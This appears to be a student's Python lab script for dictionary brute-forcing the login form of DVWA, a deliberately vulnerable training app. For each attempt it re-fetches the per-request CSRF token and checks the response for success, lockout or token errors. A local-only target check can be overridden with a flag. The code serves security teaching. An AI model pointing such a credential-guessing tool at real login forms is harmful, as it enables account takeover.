#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Практика 4. Переборщик для формы bruteforce из DVWA.
Колесников А.Ю., БСБО-03-23, студ. билет 23Б0099

Задание просит написать инструмент, который подбирает пароль к локальному
учебному стенду DVWA по адресу вида:
    /vulnerabilities/brute/?username=USER&password=PASS&user_token=TOKEN&Login=Login

Что делает скрипт:
  1. Заходит на страницу формы и забирает CSRF-токен user_token вместе
     с cookie сессии.
  2. Для каждого пароля из словаря заново открывает страницу (токен в DVWA
     high генерируется на каждый запрос), подставляет логин, пароль, токен
     и Login=Login.
  3. Смотрит на ответ: появилось ли "Welcome to the password protected area",
     не сработала ли блокировка, не отвергнут ли токен.
  4. Останавливается, когда пароль найден или сработала защита.

Перебор только словарный, а не полный: по сети каждый запрос идёт
секунды, и полный перебор 6-8 символов занял бы годы. Для формы входа
это нормальная практика, а полный перебор по маске показан в Практике 3
на офлайн-хэшах, где нет задержки сети.

Запуск против DVWA (high):
    python bruteforce_dvwa.py --url http://127.0.0.1:8081/vulnerabilities/brute/ \
        --username admin --wordlist wordlist_p4.txt

Запуск против своей защищённой формы:
    python bruteforce_dvwa.py --url http://127.0.0.1:8080/login.php \
        --username testuser --wordlist wordlist_p4.txt

Скрипт отказывается работать с чужими адресами: по умолчанию разрешены
только localhost и частные сети (10.x, 192.168.x, 172.16-31.x), чтобы
его нельзя было случайно направить на реальный сайт. Осознанно обойти
это можно флагом --allow-remote, но тогда ответственность уже на том,
кто запускает.
"""

import argparse
import csv
import ipaddress
import re
import sys
import time
from urllib.parse import urlparse

import requests


# Фразы, по которым отличаем результаты. DVWA высокого уровня пишет
# "Welcome to the password protected area", наша форма - "Добро пожаловать".
SUCCESS_MARKERS = (
    "welcome to the password protected area",
    "добро пожаловать",
)
FAILURE_MARKERS = (
    "username and/or password incorrect",
    "неверный логин или пароль",
)
LOCKOUT_MARKERS = (
    "слишком много неудачных попыток",
    "too many failed",
    "account locked",
    "temporarily locked",
)
CSRF_MARKERS = (
    "csrf token is incorrect",
    "invalid token",
    "сессия устарела",
)


def extract_token(html: str):
    """Ищем hidden input с именем user_token. Порядок атрибутов name/value
    в разных формах разный, поэтому разбираем каждый input отдельно,
    а не одной жёсткой регуляркой по всему тегу."""
    for tag in re.findall(r"<input[^>]*>", html, flags=re.IGNORECASE):
        if "user_token" not in tag:
            continue
        match = re.search(r"value\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def is_local_target(url: str) -> bool:
    """Проверяем, что цель локальная. Это не полноценная защита от
    недобросовестного использования (её в принципе нельзя сделать на
    стороне клиента), а предохранитель от случайного запуска по чужому
    адресу, вставленному в пример из интернета."""
    host = urlparse(url).hostname or ""
    if host in ("localhost", "127.0.0.1", "::1"):
        return True
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_loopback or ip.is_private
    except ValueError:
        # dvwa.local и подобные имена из учебных стендов
        return host.endswith(".local") or host.endswith(".localhost")


def read_wordlist(path: str):
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            word = line.rstrip("\r\n")
            if word and not word.startswith("#"):
                yield word


def fetch_token(session: requests.Session, url: str, timeout: float):
    response = session.get(url, timeout=timeout)
    response.raise_for_status()
    return extract_token(response.text), response.text


def dvwa_login(session: requests.Session, login_url: str, username: str,
               password: str, timeout: float) -> bool:
    """DVWA не пускает к модулю bruteforce без входа, поэтому перед перебором
    надо авторизоваться тем же способом, каким это делает браузер.
    Обычно для стенда хватает admin/password (или той учётки, которую
    поставили при настройке)."""
    token, _ = fetch_token(session, login_url, timeout)
    data = {"username": username, "password": password, "Login": "Login"}
    if token:
        data["user_token"] = token
    response = session.post(login_url, data=data, timeout=timeout)
    text = response.text.lower()
    return ("welcome" in text or response.url.rstrip("/").endswith("index.php")
            or "logout" in text)


def try_password(session: requests.Session, url: str, username: str,
                 password: str, token, timeout: float):
    """Одна попытка входа. Возвращает (status, response), где status -
    found / failed / locked / csrf / unknown."""
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
    }
    if token:
        params["user_token"] = token

    response = session.get(url, params=params, timeout=timeout)
    text = response.text.lower()

    if response.status_code == 429 or any(marker in text for marker in LOCKOUT_MARKERS):
        return "locked", response
    if any(marker in text for marker in SUCCESS_MARKERS):
        return "found", response
    if any(marker in text for marker in CSRF_MARKERS):
        return "csrf", response
    if any(marker in text for marker in FAILURE_MARKERS):
        return "failed", response

    # Иногда успешный вход - это редирект на dashboard.php. requests идёт
    # по редиректу сам, поэтому проверяем конечный URL.
    if response.url.rstrip("/").endswith("dashboard.php"):
        return "found", response
    return "unknown", response


def write_result(path: str, row: dict) -> None:
    fields = ["target", "username", "attempts", "found", "password",
              "elapsed_seconds", "status"]
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        writer = csv.DictWriter(f, fieldnames=fields)
        writer.writeheader()
        writer.writerow(row)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Словарный перебор формы входа DVWA (только локальный стенд)")
    parser.add_argument("--url", required=True,
                        help="адрес формы, например http://127.0.0.1:8081/vulnerabilities/brute/")
    parser.add_argument("--username", required=True, help="имя пользователя")
    parser.add_argument("--wordlist", default="wordlist_p4.txt", help="файл со словарём")
    parser.add_argument("--login-url",
                        help="страница входа DVWA, если модуль закрыт авторизацией")
    parser.add_argument("--login-username", help="логин для входа в сам DVWA")
    parser.add_argument("--login-password", help="пароль для входа в сам DVWA")
    parser.add_argument("--cookie", action="append", metavar="NAME=VALUE",
                        help="готовая cookie сессии (можно несколько раз)")
    parser.add_argument("--security", choices=["low", "medium", "high"],
                        help="выставить уровень DVWA через cookie security")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="пауза между попытками, секунды")
    parser.add_argument("--timeout", type=float, default=15.0,
                        help="таймаут одного HTTP-запроса, секунды")
    parser.add_argument("--max-attempts", type=int, default=0,
                        help="максимум попыток (0 - весь словарь)")
    parser.add_argument("--allow-remote", action="store_true",
                        help="разрешить нелокальный адрес (по умолчанию запрещено)")
    parser.add_argument("--results", default="bruteforce_results.csv",
                        help="файл CSV с результатом")
    parser.add_argument("--quiet", action="store_true", help="не печатать каждую попытку")
    args = parser.parse_args()

    if not is_local_target(args.url) and not args.allow_remote:
        print("Цель не похожа на локальный стенд. Разрешены localhost и частные сети.\n"
              "Если это действительно ваш стенд, добавьте --allow-remote.", file=sys.stderr)
        return 2

    try:
        words = list(read_wordlist(args.wordlist))
    except OSError as exc:
        print(f"Не удалось прочитать словарь: {exc}", file=sys.stderr)
        return 2
    if args.max_attempts:
        words = words[:args.max_attempts]
    if not words:
        print("Словарь пустой", file=sys.stderr)
        return 2

    session = requests.Session()
    session.headers.update({
        # Представляемся обычным браузером: некоторые формы отсекают
        # запросы с пустым User-Agent, и это не обход защиты, а обычная
        # совместимость с учебным стендом.
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) brute-lab/1.0",
    })

    for item in args.cookie or []:
        name, _, value = item.partition("=")
        if name and value:
            session.cookies.set(name.strip(), value.strip())

    if args.login_url:
        if not args.login_username or args.login_password is None:
            print("Для --login-url нужны --login-username и --login-password",
                  file=sys.stderr)
            return 2
        try:
            if not dvwa_login(session, args.login_url, args.login_username,
                              args.login_password, args.timeout):
                print("Не удалось войти в DVWA: проверьте логин и пароль",
                      file=sys.stderr)
                return 2
        except requests.RequestException as exc:
            print(f"Ошибка входа в DVWA: {exc}", file=sys.stderr)
            return 2
        print("Вход в DVWA выполнен")

    if args.security:
        # DVWA хранит уровень защиты в обычной cookie, поэтому её можно
        # выставить сразу, не открывая страницу security.php. Домен и путь
        # обязательно указываем те же, что у cookie, которую поставил сам
        # DVWA: иначе в запрос уйдут две cookie security (low и high),
        # и PHP возьмёт первую - то есть low.
        host = urlparse(args.url).hostname or "127.0.0.1"
        session.cookies.set("security", args.security, domain=host, path="/")

    print(f"Цель: {args.url}")
    print(f"Логин: {args.username}")
    print(f"Словарь: {args.wordlist} ({len(words)} паролей)")
    print("-" * 60)

    started = time.perf_counter()
    status = "exhausted"
    found_password = ""
    attempts = 0

    try:
        for index, password in enumerate(words, 1):
            attempts = index

            # Свежий GET перед каждой попыткой: в DVWA high токен меняется
            # на каждом запросе, а сессия должна остаться той же. Заодно
            # это показывает, что CSRF-токен сам по себе перебор не останавливает.
            try:
                token, _ = fetch_token(session, args.url, args.timeout)
            except requests.RequestException as exc:
                print(f"[{index}] ошибка получения страницы: {exc}", file=sys.stderr)
                status = "error"
                break

            try:
                result, _ = try_password(session, args.url, args.username,
                                         password, token, args.timeout)
            except requests.RequestException as exc:
                print(f"[{index}] ошибка запроса: {exc}", file=sys.stderr)
                status = "error"
                break

            # Токен мог не подойти (например, страница обновилась между
            # GET и отправкой). Один раз пробуем заново с новым токеном.
            if result == "csrf":
                try:
                    token, _ = fetch_token(session, args.url, args.timeout)
                    result, _ = try_password(session, args.url, args.username,
                                             password, token, args.timeout)
                except requests.RequestException:
                    result = "csrf"

            if not args.quiet:
                mark = {"found": "OK", "failed": "..", "locked": "!!",
                        "csrf": "CSRF", "unknown": "??"}.get(result, result)
                print(f"[{index:>3}] {password:<24} {mark}")

            if result == "found":
                status = "found"
                found_password = password
                break
            if result == "locked":
                status = "locked_out"
                break
            if result == "csrf":
                print("Сервер не принимает CSRF-токен, перебор остановлен", file=sys.stderr)
                status = "csrf_error"
                break
            if result == "unknown":
                # Неизвестный ответ - не повод молча считать его неудачей:
                # возможно, форма изменилась. Продолжаем, но предупреждаем.
                print("Неизвестный ответ сервера, проверьте страницу вручную", file=sys.stderr)

            if args.delay:
                time.sleep(args.delay)
    except KeyboardInterrupt:
        status = "interrupted"

    elapsed = time.perf_counter() - started

    print("-" * 60)
    if status == "found":
        print(f"Пароль найден: {found_password}")
    elif status == "locked_out":
        print("Сработала блокировка: сервер прекратил принимать попытки")
    elif status == "interrupted":
        print("Остановлено пользователем")
    elif status == "error":
        print("Перебор прерван из-за ошибки сети")
    elif status == "csrf_error":
        print("Перебор прерван: не удалось получить рабочий CSRF-токен")
    else:
        print("Пароль не найден: словарь закончился")

    print(f"Попыток: {attempts}")
    print(f"Время: {elapsed:.2f} с")

    row = {
        "target": args.url,
        "username": args.username,
        "attempts": attempts,
        "found": 1 if status == "found" else 0,
        "password": found_password,
        "elapsed_seconds": f"{elapsed:.3f}",
        "status": status,
    }
    write_result(args.results, row)
    print(f"Результат сохранён в {args.results}")

    return 0 if status == "found" else 1


if __name__ == "__main__":
    sys.exit(main())
